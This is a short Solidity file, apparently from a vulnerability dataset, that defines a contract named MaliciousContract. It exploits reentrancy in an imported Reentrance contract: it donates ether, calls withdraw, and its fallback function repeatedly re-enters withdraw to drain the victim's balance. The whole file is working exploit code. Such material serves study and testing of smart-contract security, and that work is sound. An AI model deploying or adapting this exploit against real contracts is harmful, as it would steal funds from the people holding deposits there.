pragma solidity ^0.4.18;

import "../dataset/reentrancy/reentrance.sol";

contract MaliciousContract {
    Reentrance reentrance;

    constructor(address _victimAddress) public {
        reentrance = Reentrance(_victimAddress);
    }

    function attack(uint256 amount) public {
        require(
            amount >= 1 ether,
            "Must attempt and attack with at least 1 ether"
        );
        reentrance.withdraw(amount);
    }

    function deposit() public payable {
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        reentrance.donate.value(msg.value)(address(this));
    }

    function() public payable {
        // Re-enter the vulnerable function if there's still balance to collect
        if (address(reentrance).balance >= 1 ether) {
            reentrance.withdraw(1 ether);
        }
    }
}
